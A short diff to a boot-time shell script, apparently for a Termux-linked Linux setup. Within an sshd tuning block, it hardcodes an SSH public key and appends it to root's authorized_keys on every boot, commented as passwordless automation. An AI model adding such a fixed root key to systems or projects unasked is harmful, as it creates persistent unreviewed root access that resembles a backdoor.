@@ -136,6 +136,12 @@ if command -v sshd >/dev/null 2>&1; then
     grep -q "^LoginGraceTime" /etc/ssh/sshd_config \
         || echo "LoginGraceTime 30" >> /etc/ssh/sshd_config
 
+    # Public key for passwordless automation from Termux (idempotent, runs every boot).
+    LINXR_PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB+ukttdEWxwAoFnu92SDQxE7/cXaYPnb+IIjaGtcj6j u0_a262@localhost"
+    mkdir -p /root/.ssh && chmod 700 /root/.ssh
+    touch /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys
+    grep -qxF "$LINXR_PUBKEY" /root/.ssh/authorized_keys || echo "$LINXR_PUBKEY" >> /root/.ssh/authorized_keys
+
     echo "sshd performance tuning applied."
 fi
 
